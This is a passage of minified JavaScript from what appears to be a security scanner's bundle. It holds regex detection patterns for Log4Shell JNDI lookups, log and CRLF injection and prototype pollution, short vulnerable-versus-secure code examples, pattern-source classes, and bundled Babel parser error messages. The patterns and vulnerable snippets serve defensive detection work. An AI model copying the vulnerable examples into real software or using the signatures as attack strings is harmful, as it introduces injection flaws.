queries",examples:{vulnerable:"",secure:""}},{id:"log4j-jndi",name:"Log4j JNDI Injection (CVE-2021-44228)",type:"vulnerable_components",severity:"critical",description:"Log4Shell vulnerability pattern",patterns:{regex:[/\$\{jndi:/gi,/logger\.(?:info|warn|error|debug)\s*\([^)]*\$\{/gi]},languages:["java"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Update Log4j to version 2.17.0 or later",examples:{vulnerable:"",secure:""}},{id:"log-injection-console",name:"Log Injection via User Input",type:"log_injection",severity:"medium",description:"User input is logged without sanitization, potentially allowing log forging attacks",patterns:{regex:[/console\.(log|error|warn|info)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/logger\.(info|error|warn|debug|trace)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/winston\.(log|info|error|warn)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/process\.(stdout|stderr)\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/fs\.(appendFile|appendFileSync)\s*\([^,]*log[^,]*,[^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i]},languages:["javascript","typescript"],cweId:"CWE-117",owaspCategory:"A09:2021",remediation:"Sanitize user input before logging. Remove or encode newline characters and control sequences.",examples:{vulnerable:'console.log("User: " + req.query.username)',secure:'console.log("User:", sanitizeForLog(req.query.username))'}},{id:"crlf-injection-headers",name:"CRLF Injection in HTTP Headers",type:"crlf_injection",severity:"high",description:"User input is used in HTTP headers without sanitization, potentially allowing header injection",patterns:{regex:[/\.setHeader\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/\.writeHead\s*\([^,]+,\s*\{[^}]*\b(req|request|params|query|body|headers)\b/i,/res\.(set|header)\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/res\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/Set-Cookie['"]\s*,[^)]*[\+`][^)]*\b(req|request|params|query|body)\b/i,/\.setHeader\s*\([^,]+,[^)]*decodeURIComponent\s*\([^)]*\b(req|request|params|query)\b/i]},languages:["javascript","typescript"],cweId:"CWE-93",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input used in HTTP headers. Remove or encode CR (\\r) and LF (\\n) characters.",examples:{vulnerable:'res.setHeader("X-User", req.query.username)',secure:'res.setHeader("X-User", sanitizeHeaderValue(req.query.username))'}},Wq({id:"prototype-pollution",name:"Prototype Pollution",patterns:[/__proto__\s*[=:]/gi,/constructor\s*\.\s*prototype\s*[=:]/gi,/\[\s*['"](__proto__|constructor|prototype)['"]\s*\]\s*=/gi,/Object\.assign\s*\([^,)]*,\s*[^)]*\b(req|request|params|query|body)\b/gi,/(_\.merge|_\.extend|_\.defaults|_\.assign)\s*\([^,)]*,\s*[^)]*\b(req|request|params|query|body)\b/gi],remediation:"Use Object.create(null) for objects, validate keys against a whitelist, or use Map instead of plain objects"})]}function Hq(X){let Q=X.toLowerCase();return lJ().filter((Y)=>Y.languages.includes(Q)||Q==="typescript"&&Y.languages.includes("javascript"))}var I90;var $q=$1(()=>{$X();Gq();I90=lJ()});class qH{client;supportedLanguages=["javascript","typescript","python","ruby","java","php","elixir"];constructor(X,Q){this.client=new cJ({apiKey:X,apiUrl:Q,cacheEnabled:!0,cacheTTL:3600,fallbackToLocal:!1})}async getPatternsByLanguage(X){try{let Q=await this.client.fetchPatterns(X.toLowerCase()),{patterns:J,fromCache:Y}=Q,W=Y?"cache":"API";return V.info(` ApiPatternSource: Retrieved ${J.length} ${X} patterns from ${W}`),V.info("PATTERN FETCH SUCCESS",{source:Y?"cache":"api",language:X,patternCount:J.length,coverageLevel:J.length>=25?"full":"partial",cached:Y}),J}catch(Q){throw V.error(` ApiPatternSource: Failed to fetch ${X} patterns`,Q),V.error("PATTERN FETCH FAILURE",{source:"api",language:X,error:Q instanceof Error?Q.message:String(Q),impact:"Will fall back to minimal patterns if hybrid mode"}),Q}}async getPatternsByType(X){let J=(await this.getAllPatterns()).filter((Y)=>Y.type===X);return V.info(`ApiPatternSource: Returning ${J.length} patterns of type ${X}`),J}async getAllPatterns(){let X=[],Q=0,J=0;for(let Y of this.supportedLanguages)try{let W=await this.client.fetchPatterns(Y);if(X.push(...W.patterns),W.fromCache)Q++;else J++}catch(W){V.warn(`Failed to fetch ${Y} patterns, continuing...`,W)}if(X.length===0){let Y=Error("Failed to fetch patterns for all languages from API");throw V.error("ApiPatternSource: No patterns retrieved from any language",Y),Y}return V.info(`ApiPatternSource: Retrieved ${X.length} total patterns (${Q} from cache, ${J} from API)`),X}}class ZH{apiSource;localSource;constructor(X,Q){this.apiSource=new qH(X,Q),this.localSource=new I6}async getPatternsByLanguage(X){try{return await this.apiSource.getPatternsByLanguage(X)}catch(Q){return V.warn(`Falling back to local patterns for ${X} due to API error`,Q),await this.localSource.getPatternsByLanguage(X)}}async getPatternsByType(X){try{return await this.apiSource.getPatternsByType(X)}catch(Q){return V.warn(`Falling back to local patterns for type ${X} due to API error`,Q),await this.localSource.getPatternsByType(X)}}async getAllPatterns(){try{return await this.apiSource.getAllPatterns()}catch(X){return V.warn("Falling back to local patterns due to API error",X),await this.localSource.getAllPatterns()}}}function L8(){let X=process.env.RSOLV_API_KEY,Q=process.env.RSOLV_API_URL,J=process.env.USE_LOCAL_PATTERNS==="true",Y=process.env.USE_FAIL_ON_MINIMAL_PATTERNS==="true";if(J){if(V.error("\uD83D\uDEA8 FORCED LOCAL PATTERNS",{reason:"USE_LOCAL_PATTERNS=true",impact:"Using minimal patterns instead of API patterns",recommendation:"Remove USE_LOCAL_PATTERNS environment variable"}),Y)throw Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Either provide RSOLV_API_KEY or unset USE_FAIL_ON_MINIMAL_PATTERNS.");return V.info("Using local pattern source (USE_LOCAL_PATTERNS=true)"),new I6}if(X)return V.info(" Using hybrid pattern source with API key"),V.info("PATTERN SOURCE SUCCESS",{source:"api",mode:"hybrid",fallbackAvailable:!0,apiKeyLength:X.length,apiKeyPrefix:X.substring(0,10)+"..."}),new ZH(X,Q);if(V.error("\uD83D\uDEA8 CRITICAL CONFIGURATION ERROR",{problem:"No RSOLV_API_KEY provided",impact:"Scanner will use minimal patterns and miss most vulnerabilities",detectionRate:"Approximately 10-20% of vulnerabilities will be detected",recommendation:"Set RSOLV_API_KEY environment variable or rsolvApiKey in workflow"}),Y)throw Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Provide RSOLV_API_KEY to use API patterns.");return V.warn("No API key provided, using local pattern source only"),new I6}var I6;var s7=$1(()=>{VH();$q();y1();I6=class I6{patterns=[];static MINIMUM_PATTERNS_PER_LANGUAGE=25;static CRITICAL_PATTERN_TYPES=["sql_injection","command_injection","xss","path_traversal","insecure_deserialization"];constructor(){this.initializePatterns()}initializePatterns(){if(this.patterns=lJ(),!process.env.RSOLV_API_KEY)V.error("\uD83D\uDEA8 CRITICAL: Using minimal patterns only",{reason:"No RSOLV_API_KEY provided",patternCount:this.patterns.length,impact:"Detection capability severely limited - will miss most vulnerabilities",recommendation:"Set RSOLV_API_KEY environment variable"}),V.warn("Using minimal fallback patterns - API connection recommended for full pattern coverage");else V.debug("LocalPatternSource initialized as fallback",{patternCount:this.patterns.length,mode:"fallback"});this.validateCriticalPatternCoverage()}validateCriticalPatternCoverage(){let X=new Set(this.patterns.map((J)=>J.type)),Q=I6.CRITICAL_PATTERN_TYPES.filter((J)=>!X.has(J));if(Q.length>0)V.error("\uD83D\uDEA8 MISSING CRITICAL PATTERN TYPES",{missing:Q,impact:"Cannot detect these vulnerability types"})}async getPatternsByLanguage(X){let Q=Hq(X),J=Math.round(Q.length/I6.MINIMUM_PATTERNS_PER_LANGUAGE*100);if(V.warn("\uD83D\uDCCA PATTERN SOURCE METRICS",{source:"local",language:X,patternCount:Q.length,expectedMinimum:I6.MINIMUM_PATTERNS_PER_LANGUAGE,coveragePercentage:`${J}%`}),Q.length<I6.MINIMUM_PATTERNS_PER_LANGUAGE)V.error(`\uD83D\uDEA8 INSUFFICIENT PATTERNS for ${X}`,{language:X,actual:Q.length,required:I6.MINIMUM_PATTERNS_PER_LANGUAGE,deficit:I6.MINIMUM_PATTERNS_PER_LANGUAGE-Q.length});return V.info(`LocalPatternSource: Returning ${Q.length} minimal ${X} patterns`),Q}async getPatternsByType(X){let Q=this.patterns.filter((J)=>J.type===X);return V.info(`LocalPatternSource: Returning ${Q.length} minimal patterns of type ${X}`),Q}async getAllPatterns(){return V.info(`LocalPatternSource: Returning ${this.patterns.length} minimal patterns total`),this.patterns}}});var tJ=m((XZ)=>{Object.defineProperty(XZ,"__esModule",{value:!0});function lb(X,Q){if(X==null)return{};var J={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(Q.indexOf(Y)!==-1)continue;J[Y]=X[Y]}return J}class C8{constructor(X,Q,J){this.line=void 0,this.column=void 0,this.index=void 0,this.line=X,this.column=Q,this.index=J}}class T4{constructor(X,Q){this.start=void 0,this.end=void 0,this.filename=void 0,this.identifierName=void 0,this.start=X,this.end=Q}}function C9(X,Q){let{line:J,column:Y,index:W}=X;return new C8(J,Y+Q,W+Q)}var zq="BABEL_PARSER_SOURCETYPE_MODULE_REQUIRED",pb={ImportMetaOutsideModule:{message:`import.meta may appear only with 'sourceType: "module"'`,code:zq},ImportOutsideModule:{message:`'import' and 'export' may appear only with 'sourceType: "module"'`,code:zq}},Uq={ArrayPattern:"array destructuring pattern",AssignmentExpression:"assignment expression",AssignmentPattern:"assignment expression",ArrowFunctionExpression:"arrow function expression",ConditionalExpression:"conditional expression",CatchClause:"catch clause",ForOfStatement:"for-of statement",ForInStatement:"for-in statement",ForStatement:"for-loop",FormalParameters:"function parameter list",Identifier:"identifier",ImportSpecifier:"import specifier",ImportDefaultSpecifier:"import default specifier",ImportNamespaceSpecifier:"import namespace specifier",ObjectPattern:"object destructuring pattern",ParenthesizedExpression:"parenthesized expression",RestElement:"rest element",UpdateExpression:{true:"prefix operation",false:"postfix operation"},VariableDeclarator:"variable declaration",YieldExpression:"yield expression"},iJ=(X)=>X.type==="UpdateExpression"?Uq.UpdateExpression[`${X.prefix}`]:Uq[X.type],db={AccessorIsGenerator:({kind:X})=>`A ${X}ter cannot be a generator.`,ArgumentsInClass:"'arguments' is only allowed in functions and class methods.",AsyncFunctionInSingleStatementContext:"Async functions can only be declared at the top level or inside a block.",AwaitBindingIdentifier:"Can not use 'await' as identifier inside an async function.",AwaitBindingIdentifierInStaticBlock:"Can not use 'await' as identifier inside a static block.",AwaitExpressionFormalParameter:"'await' is not allowed in async function parameters.",AwaitUsingNotInAsyncContext:"'await using' is only allowed within async functions and at the top levels of modules.",AwaitNotInAsyncContext:"'await' is only allowed within async functions and at the top levels of modules.",BadGetterArity:"A 'get' accessor must not have any formal parameters.",BadSetterArity:"A 'set' accessor must have exactly one formal parameter.",BadSetterRestParameter:"A 'set' accessor function argument must not be a rest parameter.",ConstructorClassField:"Classes may not have a field named 'constructor'.",ConstructorClassPrivateField:"Classes may not have a private field named '#constructor'.",ConstructorIsAccessor:"Class constructor may not be an accessor.",ConstructorIsAsync:"Constructor can't be an async function.",ConstructorIsGenerator:"Constructor can't be a generator.",DeclarationMissingInitializer:({kind:X})=>`Missing initializer in ${X} declaration.`,DecoratorArgumentsOutsideParentheses:"Decorator arguments must be moved inside parentheses: use '@(decorator(args))' instead of '@(decorator)(args)'.",DecoratorBeforeExport:"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.",DecoratorsBeforeAfterExport:"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.",DecoratorConstructor:"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?",DecoratorExportClass:"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.",DecoratorSemicolon:"Decorators must not be followed by a semicolon.",DecoratorStaticBlock:"Decorators can't be used with a static block.",DeferImportRequiresNamespace:'Only `import defer * as x from "./module"` is valid.',DeletePrivateField:"Deleting a private field is not allowed.",DestructureNamedImport:"ES2015 named imports do not destructure. Use another statement for destructuring after the import.",DuplicateConstructor:"Duplicate constructor in the same class.",DuplicateDefaultExport:"Only one default export allowed per module.",DuplicateExport:({exportName:X})=>`\`${X}\` has already been exported. Exported identifiers must be unique.`,DuplicateProto:"Redefinition of __proto__ property.",DuplicateRegExpFlags:"Duplicate regular expression flag.",ElementAfterRest:"Rest element must be last element.",EscapedCharNotAnIdentifier:"Invalid Unicode escape.",ExportBindingIsString:({localName:X,exportName:Q})=>`A string literal cannot be used as an exported binding without \`from\`.
- Did you mean \`export { '${X}' as '${Q}' } from 'some-module'\`?`,ExportDefaultFromAsIdentifier:"'from' is not allowed as an identifier after 'export default'.",ForInOfLoopInitializer:({type:X})=>`'${X==="ForInStatement"?"for-in":"for-of"}' loop variable declaration may not have an initializer.`,ForInUsing:"For-in loop may not start with 'using' declaration.",ForOfAsync:"The left-hand side of a for-of loop may not be 'async'.",ForOfLet:"The left-hand side of a for-of loop may not start with 'let'.",GeneratorInSingleStatementContext:"Generators can only be declared at the top level or inside a block.",IllegalBreakContinue:({type:X})=>`Unsyntactic ${X==="BreakStatement"?"break":"continue"}.`,IllegalLanguageModeDirective:"Illegal 'use strict' directive in function with non-simple parameter list.",IllegalReturn:"'return' outside of function.",ImportAttributesUseAssert:"The `assert` keyword in import attributes is deprecated and it has been replaced by the `with` keyword. You can enable the `deprecatedImportAssert` parser plugin to suppress this error.",ImportBindingIsString:({importName:X})=>`A string literal cannot be used as an imported binding.
- Did you mean \`import { "${X}" as foo }\`?`,ImportCallArity:"`import()` requires exactly one or two arguments.",ImportCallNotNewExpression:"Cannot use new with import(...).",ImportCallSpreadArgument:"`...` is not allowed in `import()`.",ImportJSONBindingNotDefault:"A JSON module can only be imported with `default`.",ImportReflectionHasAssertion:"`import module x` cannot have assertions.",ImportReflectionNotBinding:'Only `import module x from "./module"` is valid.',IncompatibleRegExpUVFlags:"The 'u' and 'v' regular expression flags cannot be enabled at the same time.",InvalidBigIntLiteral:"Invalid BigIntLiteral.",InvalidCodePoint:"Code point out of bounds.",InvalidCoverDiscardElement:"'void' must be followed by an expression when not used in a binding position.",InvalidCoverInitializedName:"Invalid shorthand property initializer.",InvalidDecimal:"Invalid decimal.",InvalidDigit:({radix:X})=>`Expected number in radix ${X}.`,InvalidEscapeSequence:"Bad character escape sequence.",InvalidEscapeSequenceTemplate:"Invalid escape sequence in template.",InvalidEscapedReservedWord:({reservedWord:X})=>`Escape sequence in keyword ${X}.`,InvalidIdentifier:({identifierName:X})=>`Invalid identifier ${X}.`,InvalidLhs:({ancestor:X})=>`Invalid left-hand side in ${iJ(X)}.`,InvalidLhsBinding:({ancestor:X})=>`Binding invalid left-hand side in ${iJ(X)}.`,InvalidLhsOptionalChaining:({ancestor:X})=>`Invalid optional chaining in the left-hand side of ${iJ(X)}.`,InvalidNumber:"Invalid number.",InvalidOrMissingExponent:"Floating-point numbers require a valid exponent after the 'e'.",InvalidOrUnexpectedToken:({unexpected:X})=>`Unexpected character '${X}'.`,InvalidParenthesizedAssignment:"Invalid parenthesized assignment pattern.",InvalidPrivateFieldResolution:({identifierName:X})=>`Private name #${X} is not defined.`,InvalidPropertyBindingPattern:"Binding member expression.",InvalidRecordProperty:"Only properties and spread elements are allowed in record definitions.",InvalidRestAssignmentPattern:"Invalid rest operator's argument.",LabelRedeclaration:({labelName:X})=>`Label '${X}' is already declared.`,LetInLexicalBinding:"'let' is disallowed as a lexically bound name.",LineTerminatorBeforeArrow:"No line break is allowed before '=>'.",MalformedRegExpFlags:"Invalid regular expression flag.",MissingClassName:"A class name is required.",MissingEqInAssignment:"Only '=' operator can be used for specifying default value.",MissingSemicolon:"Missing semicolon.",MissingPlugin:({missingPlugin:X})=>`This experimental syntax requires enabling the parser plugin: ${X.map((Q)=>JSON.stringify(Q)).join(", ")}.`,MissingOneOfPlugins:({missingPlugin:X})=>`This experimental syntax requires enabling one of the following parser plugin(s): ${X.map((Q)=>JSON.stringify(Q)).join(", ")}.`,MissingUnicodeEscape:"Expecting Unicode escape sequence \\uXXXX.",MixingCoalesceWithLogical:"Nullish coalescing operator(??) requires parens when mixing with logical operators.",ModuleAttributeDifferentFromType:"The only accepted module attribute is `type`.",ModuleAttributeInvalidValue:"Only string literals are allowed as module attribute values.",ModuleAttributesWithDuplicateKeys:({key:X})=>`Duplicate key "${X}" is not allowed in module attributes.`,ModuleExportNameHasLoneSurrogate:({surrogateCharCode:X})=>`An export name cannot include a lone surrogate, found '\\u${X.toString(16)}'.`,ModuleExportUndefined:({localName:X})=>`Export '${X}' is not defined.`,MultipleDefaultsInSwitch:"Multiple default clauses.",NewlineAfterThrow:"Illegal newline after throw.",NoCatchOrFinally:"Missing catch or finally clause.",NumberIdentifier:"Identifier directly after number.",NumericSeparatorInEscapeSequence:"Numeric separators are not allowed inside unicode escape sequences or hex escape sequences.",ObsoleteAwaitStar:"'await*' has been removed from the async functions proposal. Use Promise.all() instead.",OptionalChainingNoNew:"Constructors in/after an Optional Chain are not allowed.",OptionalChainingNoTemplate:"Tagged Template Literals are not allowed in optionalChain.",OverrideOnConstructor:"'override' modifier cannot appear on a constructor declaration.",ParamDupe:"Argument name clash.",PatternHasAccessor:"Object pattern can't contain getter or setter.",PatternHasMethod:"Object pattern can't contain methods.",PrivateInExpectedIn:({identifierName:X})=>`Private names are only allowed in property accesses (\`obj.#${X}\`) or in \`in\` expressions (\`#${X} in obj\`).`,PrivateNameRedeclaration:({identifierName:X})=>`Duplicate private name #${X}.`,RecordExpressionBarIncorrectEndSyntaxType:"Record expressions ending with '|}' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionBarIncorrectStartSyntaxType:"Record expressions starting with '{|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionHashIncorrectStartSyntaxType:"Record expressions starting with '#{' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",RecordNoProto:"'__proto__' is not allowed in Record expressions.",RestTrailingComma:"Unexpected trailing comma after rest element.",SloppyFunction:"In non-strict mode code, functions can only be declared at top level or inside a block.",SloppyFunctionAnnexB:"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.",SourcePhaseImportRequiresDefault:'Only `import source x from "./module"` is valid.',StaticPrototype:"Classes may not have static property named prototype.",SuperNotAllowed:"`super()` is only valid inside a class constructor of a subclass. Maybe a typo in the method name ('constructor') or not extending another class?",SuperPrivateField:"Private fields can't be accessed on super.",TrailingDecorator:"Decorators must be attached to a class element.",TupleExpressionBarIncorrectEndSyntaxType:"Tuple expressions ending with '|]' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionBarIncorrectStartSyntaxType:"Tuple expressions starting with '[|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionHashIncorrectStartSyntaxType:"Tuple expressions starting with '#[' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",UnexpectedArgumentPlaceholder:"Unexpected argument placeholder.",UnexpectedAwaitAfterPipelineBody:'Unexpected "await" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:"Unexpected digit after hash token.",UnexpectedImportExport:"'import' and 'export' may only appear at the top level.",UnexpectedKeyword:({keyword:X})=>`Unexpected keyword '${X}'.`,UnexpectedLeadingDecorator:"Leading decorators must be attached to a class declaration.",UnexpectedLexicalDeclaration:"Lexical declaration cannot appear in a single-statement context.",UnexpectedNewTarget:"`new.target` can only be used in functions or class properties.",UnexpectedNumericSeparator:"A numeric separator is only allowed between two digits.",UnexpectedPrivateField:"Unexpected private name.",UnexpectedReservedWord:({reservedWord:X})=>`Unexpected reserved word '${X}'.`,UnexpectedSuper:"'super' is only allowed in object methods and classes.",UnexpectedToken:({expected:X,unexpected:Q})=>`Unexpected token${Q?` '${Q}'.`:""}${X?`, expected "${X}"`:""}`,UnexpectedTokenUnaryExponentiation:"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.",UnexpectedUsingDeclaration:"Using declaration cannot appear in the top level when source type is `script` or in the bare case statement.",UnexpectedVoidPattern:"Unexpected void binding.",UnsupportedBind:"Binding should be performed on object property.",UnsupportedDecoratorExport:"A decorated export must export a class declaration.",UnsupportedDefaultExport:"Only expressions, functions or classes are allowed as the `default` export.",UnsupportedImport:"`import` can only be used in `import()` or `import.meta`.",UnsupportedMetaProperty:({target:X,onlyValidPropertyName:Q})=>`The only valid meta property for ${X} is ${X}.${Q}.`,UnsupportedParameterDecorator:"Decorators cannot be used to decorate parameters.",UnsupportedPropertyDecorator:"Decorators cannot be used to decorate object literal properties.",UnsupportedSuper:"'super' can only be used with function calls (i.e. super()) or in property accesses (i.e. super.prop or super[prop]).",UnterminatedComment:"Unterminated comment.",UnterminatedRegExp:"Unterminated regular expression.",UnterminatedString:"Unterminated string constant.",UnterminatedTemplate:"Unterminated template.",UsingDeclarationExport:"Using declaration cannot be exported.",UsingDeclarationHasBindingPattern:"Using declaration cannot have destructuring patterns.",VarRedeclaration:({identifierName:X})=>`Identifier '${X}' has already been declared.`,VoidPatternCatchClauseParam:"A void binding can not be the catch clause parameter. Use `try { ... } catch { ... }` if you want to discard the caught error.",VoidPatternInitializer:"A void binding may not have an initializer.",YieldBindingIdentifier:"Can not use 'yield' as identifier inside a generator.",YieldInParameter:"Yield expression is not allowed in formal parameters.",YieldNotInGeneratorFunction:"'yield' is only allowed within generator functions.",ZeroDigitNumericSeparator:"Numeric separator can not be used after leading 0."},ib={StrictDelete:"Deleting local variable in strict mode.",StrictEvalArguments:({referenceName:X})=>`Assigning to '${X}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:X})=>`Binding '${X}' in strict mode.`,StrictFunction:"In strict mode code, functions can only be declared at top level or inside a block.",StrictNumericEscape:"The only valid numeric escape in strict mode is '\\0'.",StrictOctalLiteral:"Legacy octal literals are not allowed in strict mode.",StrictWith:"'with' in strict mode."},rb={ParseExpressionEmptyInput:"Unexpected parseExpression() input: The input is empty or contains only comments.",ParseExpressionExpectsEOF:({unexpected:X})=>`Unexpected parseExpression() input: The input should contain exactly one expression, but the first expression is followed by the unexpected character \`${String.fromCodePoint(X)}\`.`},nb=new Set(["ArrowFunctionExpression","AssignmentExpression","ConditionalExpression","YieldExpression"]),ab=Object.assign({PipeBodyIsTighter:"Unexpected yield after pipeline body; any yield expression acting as Hack-style pipe body must be parenthesized due to its loose operator precedence.",PipeTopicRequiresHackPipes:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.',PipeTopicUnbound:"Topic reference is unbound; it must be inside a pipe body.",PipeTopicUnconfiguredToken:({token:X})=>`Invalid topic token ${X}. In order to use ${X} as a topic reference, the pipelineOperator plugin must be configured with { "proposal": "hack", "topicToken": "${X}" }.`,PipeTopicUnused:"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.",PipeUnparenthesizedBody:({type:X})=>`Hack-style pipe body cannot be an unparenthesized ${iJ({type:X})}; please wrap it in parentheses.`},{PipelineBodyNoArrow:'Unexpected arrow "=>" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:"Pipeline body may not be a comma-separated sequence expression.",PipelineHeadSequenceExpression:"Pipeline head should not be a comma-separated sequence expression.",PipelineTopicUnused:"Pipeline is in topic style but does not use topic reference.",PrimaryTopicNotAllowed:"Topic reference was used in a lexical context without topic binding.",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.'}),ob=["message"];function Kq(X,Q,J){Object.defineProperty(X,Q,{enumerable:!1,configurable:!0,value:J})}function sb({toMessage:X,code:Q,reasonCode:J,syntaxPlugin:Y}){let W=J==="MissingPlugin"||J==="MissingOneOfPlugins";{let G={AccessorCannotDeclareThisParameter:"AccesorCannotDeclareThisParameter",AccessorCannotHaveTypeParameters:"AccesorCannotHaveTypeParameters",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"ConstInitiailizerMustBeStringOrNumericLiteralOrLiteralEnumReference",SetAccessorCannotHaveOptionalParameter:"SetAccesorCannotHaveOptionalParameter",SetAccessorCannotHaveRestParameter:"SetAccesorCannotHaveRestParameter",SetAccessorCannotHaveReturnType:"SetAccesorCannotHaveReturnType"};if(G[J])J=G[J]}return function G(H,$){let z=SyntaxError();if(z.code=Q,z.reasonCode=J,z.loc=H,z.pos=H.index,z.syntaxPlugin=Y,W)z.missingPlugin=$.missingPlugin;return Kq(z,"clone",function(K={}){var B;let{line:q,column:Z,index:M}=(B=K.loc)!=null?B:H;return G(new C8(q,Z,M),Object.assign({},$,K.details))}),Kq(z,"details",$),Object.defineProperty(z,"message",{configurable:!0,get(){let U=`${X($)} (${H.line}:${H.column})`;return this.message=U,U},set(U){Object.defineProperty(this,"message",{value:U,writable:!0})}}),z}}function n6(X,Q){if(Array.isArray(X))return(Y)=>n6(Y,X[0]);let J={};for(let Y of Object.keys(X)){let W=X[Y],G=typeof W==="string"?{message:()=>W}:typeof W==="function"?{message:W}:W,{message:H}=G,$=lb(G,ob),z=typeof H==="string"?()=>H:H;J[Y]=sb(Object.assign({code:"BABEL_PARSER_SYNTAX_ERROR",reasonCode:Y,toMessage:z},Q?{syntaxPlugin:Q}:{},$))}return J}var x=Object.assign({},n6(pb),n6(db),n6(ib),n6(rb),n6`pipelineOperator`(ab));function tb(){return{sourceType:"script",sourceFilename:void 0,startIndex:0,startColumn:0,startLine:1,allowAwaitOutsideFunction:!1,allowReturnOutsideFunction:!1,allowNewTargetOutsideFunction:!1,allowImportExportEverywhere:!1,allowSuperOutsideMethod:!1,allowUndeclaredExports:!1,allowYieldOutsideFunction:!1,plugins:[],strictMode:null,ranges:!1,tokens:!1,createImportExpressions:!1,createParenthesizedExpressions:!1,errorRecovery:!1,attachComment:!0,annexB:!0}}function eb(X){let Q=tb();if(X==null)return Q;if(X.annexB!=null&&X.annexB!==!1)throw Error("The `annexB` option can only be set to `false`.");for(let J of Object.keys(Q))if(X[J]!=null)Q[J]=X[J];if(Q.startLine===1){if(X.startIndex==null&&Q.startColumn>0)Q.startIndex=Q.startColumn;else if(X.startColumn==null&&Q.startIndex>0)Q.startColumn=Q.startIndex}else if(X.startColumn==null||X.startIndex==null){if(X.startIndex!=null)throw Error("With a `startLine > 1` you must also specify `startIndex` and `startColumn`.")}if(Q.sourceType==="commonjs"){if(X.allowAwaitOutsideFunction!=null)throw Error("The `allowAwaitOutsideFunction` option cannot be used with `sourceType: 'commonjs'`.");if(X.allowReturnOutsideFunction!=null)throw Error("`sourceType: 'commonjs'` implies `allowReturnOutsideFunction: true`, please remove the `allowReturnOutsideFunction` option or use `sourceType: 'script'`.");if(X.allowNewTargetOutsideFunction!=null)throw Error("`sourceType: 'commonjs'` implies `allowNewTargetOutsideFunction: true`, please remove the `allowNewTargetOutsideFunction` option or use `sourceType: 'script'`.")}return Q}var{defineProperty:Xv}=Object,Vq=(X,Q)=>{if(X)Xv(X,Q,{enumerable:!1,value:X[Q]})};function N4(X){return Vq(X.loc.start,"index"),Vq(X.loc.end,"index"),X}var Qv=(X)=>class extends X{parse(){let J=N4(super.parse());if(this.optionFlags&256)J.tokens=J.tokens.map(N4);return J}parseRegExpLiteral({pattern:J,flags:Y}){let W=null;try{W=new RegExp(J,Y)}catch(H){}let G=this.estreeParseLiteral(W);return G.regex={pattern:J,flags:Y},G}parseBigIntLiteral(J){let Y;try{Y=BigInt(J)}catch(G){Y=null}let W=this.estreeParseLiteral(Y);return W.bigint=String(W.value||J),W}parseDecimalLiteral(J){let W=this.estreeParseLiteral(null);return W.decimal=String(W.value||J),W}estreeParseLiteral(J){return this.parseLiteral(J,"Literal")}parseStringLiteral(J){return this.estreeParseLiteral(J)}parseNumericLiteral(J){return this.estreeParseLiteral(J)}parseNullLiteral(){return this.estreeParseLiteral(null)}parseBooleanLiteral(J){return this.estreeParseLiteral(J)}estreeParseChainExpression(J,Y){let W=this.startNodeAtNode(J);return W.expression=J,this.finishNodeAt(W,"ChainExpression",Y)}directiveToStmt(J){let Y=J.value;delete J.value,this.castNodeTo(Y,"Literal"),Y.raw=Y.extra.raw,Y.value=Y.extra.expressionValue;let W=this.castNodeTo(J,"ExpressionStatement");return W.expression=Y,W.directive=Y.extra.rawValue,delete Y.extra,W}fillOptionalPropertiesForTSESLint(J){}cloneEstreeStringLiteral(J){let{start:Y,end:W,loc:G,range:H,raw:$,value:z}=J,U=Object.create(J.constructor.prototype);return U.type="Literal",U.start=Y,U.end=W,U.loc=G,U.range=H,U.raw=$,U.value=z,U}initFunction(J,Y){super.initFunction(J,Y),J.expression=!1}checkDeclaration(J){if(J!=null&&this.isObjectProperty(J))this.checkDeclaration(J.value);else super.checkDeclaration(J)}getObjectOrClassMethodParams(J){return J.value.params}isValidDirective(J){var Y;return J.type==="ExpressionStatement"&&J.expression.type==="Literal"&&typeof J.expression.value==="string"&&!((Y=J.expression.extra)!=null&&Y.parenthesized)}parseBlockBody(J,Y,W,G,H){super.parseBlockBody(J,Y,W,G,H);let $=J.directives.map((z)=>this.directiveToStmt(z));J.body=$.concat(J.body),delete J.directives}parsePrivateName(){let J=super.parsePrivateName();if(!this.getPluginOption("estree","classFeatures"))return J;return this.convertPrivateNameToPrivateIdentifier(J)}convertPrivateNameToPrivateIdentifier(J){let Y=super.getPrivateNameSV(J);return 